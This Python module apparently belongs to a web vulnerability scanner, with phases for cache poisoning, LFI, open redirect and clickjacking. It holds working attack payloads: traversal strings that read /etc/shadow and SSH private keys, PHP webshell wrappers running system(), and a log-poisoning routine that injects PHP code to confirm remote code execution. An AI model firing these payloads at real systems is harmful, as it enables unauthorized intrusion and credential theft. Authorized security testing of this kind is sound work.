"""Client-side vulnerability phases: cache poisoning, LFI, open redirect, clickjacking, CRLF, CORS, file upload, CSP bypass, stored XSS."""

import asyncio
import base64
import os
import shlex
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

from vulnforge.phases.helpers import (
    _SKIP_PARAMS,
    PhaseSet,
    _is_static_url,
)
from vulnforge.process import (
    _PIPELINE_CFG,
    _USE_PROXYCHAINS,
    _run,
)
from vulnforge.tools import Tools
from vulnforge.utils import (
    _async_urlopen,
    _async_urlopen_no_redirect,
    _extra_headers_dict,
    _get_urlopener,
    _throttle_rate,
    count_nonblank,
    ensure,
    log,
    read_lines,
)

_CACHE_POISON_HEADERS = [
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Scheme",
    "X-Original-URL",
    "X-Rewrite-URL",
]
_CACHE_KEY_DISCLOSURE_HEADERS = [
    "Pragma: x-get-cache-key",
    "X-Cache-Key",
    "X-Cache-Path",
    "X-Cache-Params",
]


async def phase_28_CACHED(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"28-CACHED"}:
        return {}
    _out = outdir / "cache_poison.txt"
    if _out.exists() and not force:
        return {"28-CACHED": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 28-CACHED: web cache poisoning/deception probes")
    findings: List[str] = []
    cp_urlopen = _get_urlopener()
    _cp_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [f"https://{h}" if not h.startswith("http") else h for h in read_lines(hosts_file)][
        : _PIPELINE_CFG.sample_hosts_cached
    ]
    if not targets:
        log("WARNING", "28-CACHED: no HTTP targets; skipping")
        return {"28-CACHED": str(_out), "count": 0}

    async def _probe_cached(url: str) -> List[str]:
        results: List[str] = []

        async def _clean_fetch() -> Tuple[int, Any, bytes]:
            clean_req = urllib.request.Request(
                url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers}
            )
            return await _async_urlopen(cp_urlopen, clean_req, timeout=10)

        try:
            base_req = urllib.request.Request(
                url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers}
            )
            base_status, base_headers, base_body = await _async_urlopen(
                cp_urlopen, base_req, timeout=10
            )
            base_cached = (
                "x-cache" in str(base_headers).lower()
                or "age:" in str(base_headers).lower()
                or "cf-cache" in str(base_headers).lower()
            )
            if base_cached:
                results.append(f"[cache-detected] {url} — caching headers present")
            for hdr in _CACHE_POISON_HEADERS:
                try:
                    poison_req = urllib.request.Request(
                        url,
                        method="GET",
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            hdr: "evil.example.com",
                            **_cp_extra_headers,
                        },
                    )
                    p_status, p_headers, p_body = await _async_urlopen(
                        cp_urlopen, poison_req, timeout=10
                    )
                    p_str = str(p_headers).lower()
                    if p_body:
                        p_str += p_body.decode("utf-8", errors="ignore").lower()
                    if "evil.example.com" in p_str:
                        try:
                            _, clean_headers, clean_body = await _clean_fetch()
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            clean_headers, clean_body = {}, b""
                        clean_str = str(clean_headers).lower()
                        if clean_body:
                            clean_str += clean_body.decode("utf-8", errors="ignore").lower()
                        if "evil.example.com" in clean_str:
                            results.append(
                                f"[cache-poison-candidate] {url} via {hdr}: evil.example.com persisted in clean follow-up request (cached)"
                            )
                        else:
                            results.append(
                                f"[cache-poison-info] {url} via {hdr}: evil.example.com reflected but not cached"
                            )
                        break
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
            for dhdr in _CACHE_KEY_DISCLOSURE_HEADERS:
                try:
                    d_req = urllib.request.Request(
                        url,
                        method="GET",
                        headers={"User-Agent": "Mozilla/5.0", dhdr: "1", **_cp_extra_headers},
                    )
                    _, d_headers, d_body = await _async_urlopen(cp_urlopen, d_req, timeout=10)
                    d_str = str(d_headers).lower() + d_body.decode("utf-8", errors="ignore").lower()
                    if "cache-key" in d_str:
                        results.append(f"[cache-key-disclosure] {url} via {dhdr}")
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
            # X-Original-URL / X-Rewrite-URL / X-HTTP-Method-Override
            for alt_hdr in ["X-Original-URL", "X-Rewrite-URL", "X-HTTP-Method-Override"]:
                try:
                    alt_req = urllib.request.Request(
                        url + "/nonexistent-cache-test",
                        method="GET",
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            alt_hdr: "/admin",
                            **_cp_extra_headers,
                        },
                    )
                    _, alt_headers, _ = await _async_urlopen(cp_urlopen, alt_req, timeout=10)
                    if "x-cache" in str(alt_headers).lower() or "age:" in str(alt_headers).lower():
                        results.append(f"[cache-deception-candidate] {url} via {alt_hdr}: /admin")
                except asyncio.CancelledError:
                    raise
                except Exception:
                    pass
            # Web Cache Deception: append static extensions
            base_body_lower = (
                base_body.decode("utf-8", errors="ignore").lower() if base_body else ""
            )
            for ext in [".css", ".js", ".png"]:
                try:
                    wcd_parsed = urllib.parse.urlparse(url)
                    wcd_url = urllib.parse.urlunparse(
                        wcd_parsed._replace(path=(wcd_parsed.path.rstrip("/") or "/") + ext)
                    )
                    wcd_req = urllib.request.Request(
                        wcd_url,
                        method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers},
                    )
                    _, wcd_headers, wcd_body = await _async_urlopen(cp_urlopen, wcd_req, timeout=10)
                    wcd_str = str(wcd_headers).lower()
                    if ("x-cache" in wcd_str or "age:" in wcd_str) and wcd_body:
                        wcd_body_lower = wcd_body.decode("utf-8", errors="ignore").lower()
                        if (
                            base_body_lower
                            and wcd_body_lower
                            and len(wcd_body_lower) > 50
                            and (
                                wcd_body_lower.find("<!doctype") >= 0
                                or wcd_body_lower.find("<html") >= 0
                            )
                        ):
                            results.append(
                                f"[wcd-candidate] {wcd_url} — static extension trick returns user data"
                            )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
            # Cache key confusion: double-encoded params
            parsed = urllib.parse.urlparse(url)
            qs = parsed.query
            try:
                if qs:
                    double_enc_qs = urllib.parse.quote(qs)
                    conf_url = urllib.parse.urlunparse(parsed._replace(query=double_enc_qs))
                    conf_req = urllib.request.Request(
                        conf_url,
                        method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers},
                    )
                    _, conf_headers, conf_body = await _async_urlopen(
                        cp_urlopen, conf_req, timeout=10
                    )
                    if conf_body != base_body:
                        _, _, clean_body = await _clean_fetch()
                        if clean_body == conf_body:
                            results.append(
                                f"[cache-key-confusion] {url} — double-encoded param cached and served to normal request"
                            )
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            try:
                if qs:
                    semi_qs = qs.replace("&", ";")
                    semi_url = urllib.parse.urlunparse(parsed._replace(query=semi_qs))
                    semi_req = urllib.request.Request(
                        semi_url,
                        method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers},
                    )
                    _, semi_headers, semi_body = await _async_urlopen(
                        cp_urlopen, semi_req, timeout=10
                    )
                    if semi_body != base_body:
                        _, _, clean_body = await _clean_fetch()
                        if clean_body == semi_body:
                            results.append(
                                f"[cache-key-confusion] {url} — semicolons cached and served to normal request"
                            )
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            try:
                post_req = urllib.request.Request(
                    url,
                    method="POST",
                    data=b"",
                    headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers},
                )
                po_status, po_headers, po_body = await _async_urlopen(
                    cp_urlopen, post_req, timeout=10
                )
                if po_body == base_body and "x-cache" in str(po_headers).lower():
                    _, clean_headers, clean_body = await _clean_fetch()
                    if clean_body == base_body and "x-cache" in str(clean_headers).lower():
                        results.append(
                            f"[cache-key-confusion] {url} — POST request produces same cache as GET"
                        )
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            # Mergeable params
            try:
                if qs:
                    parsed_qs = urllib.parse.parse_qs(qs, keep_blank_values=True)
                    if parsed_qs:
                        fst_key = next(iter(parsed_qs))
                        merge_qs = urllib.parse.urlencode({fst_key: ["1", "2"]}, doseq=True)
                        merge_url = urllib.parse.urlunparse(parsed._replace(query=merge_qs))
                        merge_req = urllib.request.Request(
                            merge_url,
                            method="GET",
                            headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers},
                        )
                        _, merge_headers, merge_body = await _async_urlopen(
                            cp_urlopen, merge_req, timeout=10
                        )
                        if merge_body != base_body:
                            results.append(
                                f"[mergeable-params] {url} — param merging causes different response"
                            )
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            # Chunked encoding + cache
            try:
                chunked_req = urllib.request.Request(
                    url,
                    method="GET",
                    headers={
                        "User-Agent": "Mozilla/5.0",
                        "Transfer-Encoding": "chunked",
                        "Content-Length": "0",
                        **_cp_extra_headers,
                    },
                )
                _, chunked_headers, _ = await _async_urlopen(cp_urlopen, chunked_req, timeout=10)
                if "x-cache" in str(chunked_headers).lower():
                    results.append(
                        f"[chunked-cache] {url} — chunked encoding with Content-Length returns cached response"
                    )
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            # Cache TTL fingerprint
            try:
                ttl_req1 = urllib.request.Request(
                    url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers}
                )
                _, ttl_h1, _ = await _async_urlopen(cp_urlopen, ttl_req1, timeout=10)
                await asyncio.sleep(1)
                ttl_req2 = urllib.request.Request(
                    url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers}
                )
                _, ttl_h2, _ = await _async_urlopen(cp_urlopen, ttl_req2, timeout=10)
                age1 = ttl_h1.get("Age")
                age2 = ttl_h2.get("Age")
                if age1 is not None and age2 is not None:
                    try:
                        age_diff = int(age2) - int(age1)
                        if age_diff >= 0:
                            results.append(
                                f"[cache-ttl] {url} — TTL ~{age_diff}s based on Age vs Date"
                            )
                    except (ValueError, TypeError):
                        pass
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        # Unkeyed cookie poisoning: a reflected cookie canary served from cache
        try:
            cookie_canary = base64.b64encode(os.urandom(8)).decode()
            cookie_val = "tracking=" + cookie_canary
            cookie_req = urllib.request.Request(
                url,
                method="GET",
                headers={"User-Agent": "Mozilla/5.0", "Cookie": cookie_val, **_cp_extra_headers},
            )
            _, cookie_headers, cb = await _async_urlopen(cp_urlopen, cookie_req, timeout=10)
            cookie_str = (cb or b"").decode("utf-8", errors="ignore") + str(cookie_headers).lower()
            if cookie_canary in cookie_str:
                _, clean_headers, clean_body = await _clean_fetch()
                clean_str = (clean_body or b"").decode("utf-8", errors="ignore") + str(
                    clean_headers
                ).lower()
                if cookie_canary in clean_str:
                    results.append(
                        f"[cache-cookie-unkeyed] {url} — cookie canary served from cache to a cookie-less request"
                    )
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        # Vary header poisoning: reflected X-Forwarded-Host served from cache
        try:
            vary_canary = "vary" + base64.b64encode(os.urandom(6)).decode().rstrip("=")
            v_req = urllib.request.Request(
                url,
                method="GET",
                headers={
                    "User-Agent": "Mozilla/5.0",
                    "X-Forwarded-Host": vary_canary,
                    **_cp_extra_headers,
                },
            )
            _, vh, vb = await _async_urlopen(cp_urlopen, v_req, timeout=10)
            vary_str = (vb or b"").decode("utf-8", errors="ignore") + str(vh).lower()
            if vary_canary in vary_str:
                _, clean_headers, clean_body = await _clean_fetch()
                clean_str = (clean_body or b"").decode("utf-8", errors="ignore") + str(
                    clean_headers
                ).lower()
                if vary_canary in clean_str:
                    results.append(
                        f"[cache-vary-bypass] {url} — X-Forwarded-Host reflected and served from cache (Vary ignored)"
                    )
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        # Cache key manipulation via X-Original-URL / X-Rewrite-URL with different paths
        for man_hdr in ["X-Original-URL", "X-Rewrite-URL"]:
            for man_path in ["/admin", "/../admin", "/%2e%2e/admin"]:
                try:
                    man_req = urllib.request.Request(
                        url,
                        method="GET",
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            man_hdr: man_path,
                            **_cp_extra_headers,
                        },
                    )
                    mans, manh, manb = await _async_urlopen(cp_urlopen, man_req, timeout=10)
                    man_str = str(manh).lower()
                    if "x-cache" in man_str or "age:" in man_str:
                        results.append(
                            f"[cache-key-manipulation] {url} via {man_hdr}: {man_path} returns cached response"
                        )
                except Exception:
                    continue
        return results

    cp_results = await asyncio.gather(*[_probe_cached(t) for t in targets])
    for cr in cp_results:
        findings.extend(cr)
    if not findings:
        findings.append("[cached] No cache poisoning candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"28-CACHED: {len(findings)} cache probes → {out}")
    return {"28-CACHED": str(out), "count": len(findings)}


async def phase_30_LFI(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"30-LFI"}:
        return {}
    _out = outdir / "lfi.txt"
    if _out.exists() and not force:
        return {"30-LFI": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 30-LFI: path traversal / local file inclusion probes")
    findings: List[str] = []
    _lfi_urlopen = _get_urlopener()
    _lfi_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("WARNING", "30-LFI: no URLs; skipping")
        return {"30-LFI": str(_out), "count": 0}
    # Identify file-read parameters
    file_params = [
        "file",
        "page",
        "template",
        "include",
        "path",
        "doc",
        "document",
        "folder",
        "root",
        "load",
        "read",
        "dir",
        "show",
        "view",
        "content",
        "editor",
        "preview",
        "resource",
        "config",
        "language",
        "lang",
        "style",
        "template",
        "plugin",
    ]
    param_urls = [
        u
        for u in all_urls
        if "=" in u and not _is_static_url(u) and any(f"{p}=" in u.lower() for p in file_params)
    ]
    if not param_urls:
        param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)]
    param_urls = param_urls[: _PIPELINE_CFG.sample_urls_lfi]
    if not param_urls:
        log("WARNING", "30-LFI: no parameter-bearing URLs; skipping")
        return {"30-LFI": str(_out), "count": 0}
    findings.append(f"target_urls={len(param_urls)}")
    lfi_payloads = [
        "/etc/passwd",
        "/etc/passwd%00",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "../../../windows/win.ini",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/0",
        "/var/log/apache/access.log",
        "/var/log/apache2/access.log",
        "/var/log/httpd/access_log",
        "/var/log/nginx/access.log",
        "/etc/issue",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/resolv.conf",
        "/etc/ssh/sshd_config",
        "/root/.bash_history",
        "/home/ubuntu/.bash_history",
        "/home/admin/.ssh/id_rsa",
        "/home/ubuntu/.ssh/authorized_keys",
        "/var/www/html/config.php",
        "/var/www/config.php",
        "/var/www/application/config/database.php",
        "/web.config",
        "/WEB-INF/web.xml",
        "/WEB-INF/db.properties",
        # PHP wrappers
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/convert.base64-encode/resource=/var/www/html/config.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "php://filter/convert.base64-encode/resource=php://input",
        "php://input",
        "php://stdin",
        "php://temp",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=",
        "data://text/plain,<?php system($_GET['c']); ?>",
        "expect://id",
        "compress.zlib:///etc/passwd",
        "compress.bzip2:///etc/passwd",
        "phar:///var/www/html/file.zip/shell.php",
        # Double-encoding variants
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        # Null-byte variants
        "/etc/passwd%00.html",
        "/etc/passwd%00.jpg",
        # Windows paths
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "C:/windows/win.ini",
        "..\\..\\..\\windows\\system32\\config\\sam",
        # Java/Tomcat paths
        "/WEB-INF/web.xml",
        "/WEB-INF/classes/application.properties",
        "/META-INF/MANIFEST.MF",
        "/META-INF/context.xml",
        # Log paths for log poisoning
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/mail.log",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/version",
        "/proc/cmdline",
        "/proc/net/tcp",
        # PHP session wrapper
        "/tmp/sess_*",
        "php://filter/convert.base64-encode/resource=/tmp/sess_*",
        # /proc/self deep enumeration
        "/proc/self/fd/3",
        "/proc/self/fd/4",
        "/proc/self/fd/5",
        "/proc/self/fd/6",
        "/proc/self/fd/7",
        "/proc/self/fd/8",
        "/proc/self/fd/9",
        "/proc/self/fd/10",
        "/proc/self/environ",
        "/proc/self/status",
        "/proc/self/cgroup",
        "/proc/self/mounts",
        "/proc/self/fd/0",
        "/proc/self/cmdline",
        # SSH key leaks
        "/root/.ssh/id_rsa",
        "/home/*/.ssh/id_rsa",
        "/home/*/.ssh/authorized_keys",
        "/root/.ssh/authorized_keys",
        "/etc/ssh/ssh_config",
        "/etc/ssh/sshd_config",
        # Additional log paths for log poisoning (referer, cookie, x-forwarded-for)
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/apache/access.log",
        "/var/log/apache/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        "/var/log/auth.log",
        "/var/log/maillog",
        "/var/log/mysql/error.log",
        # Windows deeper paths
        "C:/inetpub/wwwroot/web.config",
        "C:/Program Files/Apache Group/Apache/conf/httpd.conf",
        "C:/xampp/passwords.txt",
        "C:/xampp/phpMyAdmin/config.inc.php",
        "C:/Users/Administrator/NTUSER.DAT",
        # Java resources
        "/WEB-INF/web.xml",
        "/WEB-INF/classes/application.properties",
        "/WEB-INF/database.properties",
        "/META-INF/MANIFEST.MF",
        # cloud metadata-like files
        "/proc/1/cgroup",
        "php://filter/convert.base64-encode/resource=index.php",
        "/proc/self/cwd/index.php",
        "/proc/self/root/etc/passwd",
    ]
    lfi_indicators = [
        "root:x:0:0:",
        "daemon:x:1:1:",
        "bin:x:2:2:",
        "sys:x:3:3:",
        "nobody:x:",
        "www-data:x:",
        "mysql:x:",
        "postgres:x:",
        "[extensions]",
        "[fonts]",
        "ssh-rsa",
        "ssh-dss",
        "BEGIN RSA PRIVATE KEY",
        "BEGIN PRIVATE KEY",
        "MIIE",
        "<configuration>",
        "<web-app",
        "vulnforge_test",
    ]

    async def _probe_lfi(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        base_len = None
        try:
            base_req = urllib.request.Request(
                url, headers={"User-Agent": "Mozilla/5.0", **_lfi_extra_headers}
            )
            _, _, base_body = await _async_urlopen(_lfi_urlopen, base_req, timeout=10)
            base_len = len(base_body)
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        for pname in qs:
            if not any(fp in pname.lower() for fp in file_params):
                continue
            for payload in lfi_payloads:
                await _throttle_rate()
                encoded_payload = urllib.parse.quote(payload, safe="")
                query_parts = []
                for k, vals in qs.items():
                    for v in vals:
                        if k == pname:
                            query_parts.append(f"{urllib.parse.quote_plus(k)}={encoded_payload}")
                        else:
                            query_parts.append(
                                f"{urllib.parse.quote_plus(k)}={urllib.parse.quote_plus(v)}"
                            )
                new_qs = "&".join(query_parts)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(
                        test_url, headers={"User-Agent": "Mozilla/5.0", **_lfi_extra_headers}
                    )
                    lfi_status, _, lfi_body = await _async_urlopen(_lfi_urlopen, req, timeout=10)
                    body_text = lfi_body.decode("utf-8", errors="ignore")
                    if any(ind in body_text for ind in lfi_indicators):
                        results.append(
                            f"[lfi-confirmed] {test_url} → param={pname} payload={payload}"
                        )
                        # Show first 3 lines of response as evidence
                        for sample_line in body_text.splitlines()[:3]:
                            if sample_line.strip():
                                results.append(f"  {sample_line[:200]}")
                    elif (
                        lfi_status == 200
                        and base_len is not None
                        and abs(len(lfi_body) - base_len) > max(300, base_len * 0.2)
                    ):
                        results.append(
                            f"[lfi-candidate] {test_url} → param={pname} payload={payload} len={len(lfi_body)}"
                        )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
        return results

    probe_results = await asyncio.gather(*[_probe_lfi(u) for u in param_urls])
    for pr in probe_results:
        findings.extend(pr)
    # Log poisoning: inject PHP code into Referer, Cookie, X-Forwarded-For headers
    # then use LFI to include the log file to trigger RCE
    log_poison_payloads = [
        "<?php system('id'); ?>",
        "<?php echo 'vulnforge_test'; ?>",
        "<?=phpinfo()?>",
    ]
    log_files = [
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/apache/access.log",
        "/var/log/apache/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
    ]
    poison_headers_list = [
        ("Referer", "Mozilla/5.0"),
        ("X-Forwarded-For", "127.0.0.1"),
        ("Cookie", "tracking=1"),
    ]
    if param_urls:
        # Pick first URL for log poisoning test
        log_test_url = param_urls[0].split("?")[0]
        for payload in log_poison_payloads:
            for hdr_name, hdr_default in poison_headers_list:
                try:
                    poison_headers = {
                        "User-Agent": payload,
                        hdr_name: hdr_default,
                        **_lfi_extra_headers,
                    }
                    req = urllib.request.Request(
                        log_test_url,
                        headers=poison_headers,
                    )
                    await _async_urlopen(_lfi_urlopen, req, timeout=10)
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue

        # Now try to include the log files via LFI
        for log_file in log_files:
            for poison_url in param_urls[:5]:
                try:
                    parsed = urllib.parse.urlparse(poison_url)
                    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                    for pname in qs:
                        if any(fp in pname.lower() for fp in file_params):
                            encoded_payload = urllib.parse.quote(log_file, safe="")
                            query_parts = []
                            for k, vals in qs.items():
                                for v in vals:
                                    if k == pname:
                                        query_parts.append(
                                            f"{urllib.parse.quote_plus(k)}={encoded_payload}"
                                        )
                                    else:
                                        query_parts.append(
                                            f"{urllib.parse.quote_plus(k)}={urllib.parse.quote_plus(v)}"
                                        )
                            new_qs = "&".join(query_parts)
                            test_log_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                            await _throttle_rate()
                            req = urllib.request.Request(
                                test_log_url,
                                headers={"User-Agent": "Mozilla/5.0", **_lfi_extra_headers},
                            )
                            log_status, _, log_body = await _async_urlopen(
                                _lfi_urlopen, req, timeout=10
                            )
                            log_text = log_body.decode("utf-8", errors="ignore")
                            if "vulnforge_test" in log_text or "uid=" in log_text:
                                findings.append(
                                    f"[log-poison-rce] {test_log_url} - log poisoning RCE confirmed via {log_file}"
                                )
                            elif any(p in log_text for p in log_poison_payloads):
                                findings.append(
                                    f"[log-poison-candidate] {test_log_url} - injected User-Agent payload reflected in {log_file}"
                                )
                            break
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
    if not findings:
        findings.append("[result] No LFI vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"30-LFI: {len(findings)} findings → {out}")
    return {"30-LFI": str(_out), "count": len(findings)}


_OPENREDIR_PARAMS = [
    "url",
    "next",
    "redirect",
    "redirect_uri",
    "redirect_url",
    "return",
    "return_to",
    "return_url",
    "returnurl",
    "ret",
    "target",
    "target_url",
    "dest",
    "destination",
    "destination_url",
    "redir",
    "rurl",
    "link",
    "goto",
    "out",
    "view",
    "file",
    "load",
    "path",
    "continue",
    "callback",
    "redirect_to",
    "back",
    "ref",
    "referer",
    "referrer",
]

_OPENREDIR_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "\\\\evil.com",
    "https:%2f%2fevil.com",
    "%2f%2fevil.com",
    "https://evil.com.evil2.com",
]


def _open_redirect_host(value: str) -> Optional[str]:
    loc = value.strip().replace("\\", "/")
    parsed = urllib.parse.urlparse(loc)
    if parsed.hostname:
        return parsed.hostname.lower()
    if loc.startswith("//"):
        hostname = urllib.parse.urlparse("https:" + loc).hostname
        return hostname.lower() if hostname else None
    return None


def _redirect_target_hosts(payload: str) -> Set[str]:
    hosts: Set[str] = set()
    for variant in (payload, urllib.parse.unquote(payload)):
        host = _open_redirect_host(variant)
        if host:
            hosts.add(host)
    return hosts


async def phase_31_OPENREDIR(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"31-OPENREDIR"}:
        return {}
    _out = outdir / "open_redirect.txt"
    if _out.exists() and not force:
        return {"31-OPENREDIR": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 31-OPENREDIR: open redirect detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("WARNING", "31-OPENREDIR: no URLs; skipping")
        return {"31-OPENREDIR": str(_out), "count": 0}
    findings: List[str] = []
    _or_urlopen = _get_urlopener()
    _or_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][
        : _PIPELINE_CFG.sample_urls_redirect
    ]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            if param_name.lower() not in _OPENREDIR_PARAMS:
                continue
            for redirect_val in _OPENREDIR_PAYLOADS:
                test_qs = qs.copy()
                test_qs[param_name] = [redirect_val]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(
                        test_url,
                        method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_or_extra_headers},
                    )
                    resp_status, resp_headers, _ = await _async_urlopen_no_redirect(req, timeout=10
                    )
                    location = resp_headers.get("Location", "") or resp_headers.get("location", "")
                    if _open_redirect_host(location) in _redirect_target_hosts(redirect_val):
                        findings.append(
                            f"[open-redirect] {test_url} -> {location} (HTTP {resp_status})"
                        )
                except urllib.error.HTTPError as e:
                    location = e.headers.get("Location", "") or e.headers.get("location", "")
                    if _open_redirect_host(location) in _redirect_target_hosts(redirect_val):
                        findings.append(f"[open-redirect] {test_url} -> {location} (HTTP {e.code})")
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
    if not findings:
        findings.append("[open-redirect] No open redirect candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"31-OPENREDIR: {len(findings)} open redirect probes -> {out}")
    return {"31-OPENREDIR": str(out), "count": len(findings)}


_CLICKJACK_HEADERS_TO_CHECK = ["X-Frame-Options", "Content-Security-Policy"]


def _xfo_effective(value: str) -> bool:
    return value.strip().upper() in ("DENY", "SAMEORIGIN")


def _frame_ancestors_effective(csp: str, url: str) -> bool:
    url_host = urllib.parse.urlparse(url).hostname
    found = False
    for directive in csp.split(";"):
        directive = directive.strip()
        if not directive:
            continue
        dname, _, dval = directive.partition(" ")
        if dname.strip().lower() != "frame-ancestors":
            continue
        found = True
        sources = [s.strip().lower() for s in dval.split() if s.strip()]
        if not sources:
            return False
        for src in sources:
            if src in ("'none'", "'self'"):
                continue
            src_host = urllib.parse.urlparse(src).hostname
            if src_host is None and "." in src:
                src_host = src.split(":")[0]
            if src_host and src_host == url_host:
                continue
            return False
    return found


async def phase_32_CLICKJACK(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"32-CLICKJACK"}:
        return {}
    _out = outdir / "clickjacking.txt"
    if _out.exists() and not force:
        return {"32-CLICKJACK": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 32-CLICKJACK: clickjacking protection detection")
    findings: List[str] = []
    _cj_urlopen = _get_urlopener()
    _cj_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [f"https://{h}" if not h.startswith("http") else h for h in read_lines(hosts_file)][
        : _PIPELINE_CFG.sample_hosts_clickjack
    ]
    if not targets:
        log("WARNING", "32-CLICKJACK: no HTTP targets; skipping")
        return {"32-CLICKJACK": str(_out), "count": 0}
    for url in targets:
        try:
            req = urllib.request.Request(
                url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_cj_extra_headers}
            )
            _, resp_headers, _ = await _async_urlopen(_cj_urlopen, req, timeout=10)
            xfo = resp_headers.get("X-Frame-Options", "")
            csp = resp_headers.get("Content-Security-Policy", "")
            protected = _xfo_effective(xfo) or _frame_ancestors_effective(csp, url)
            if not protected:
                findings.append(
                    f"[clickjacking-missing] {url} — no effective X-Frame-Options or CSP frame-ancestors"
                )
            elif not _xfo_effective(xfo):
                log("INFO", f"32-CLICKJACK: {url} — protected by CSP frame-ancestors only")
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
    if not findings:
        findings.append("[clickjacking] All targets have clickjacking protection (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"32-CLICKJACK: {len(findings)} clickjacking checks -> {out}")
    return {"32-CLICKJACK": str(out), "count": len(findings)}


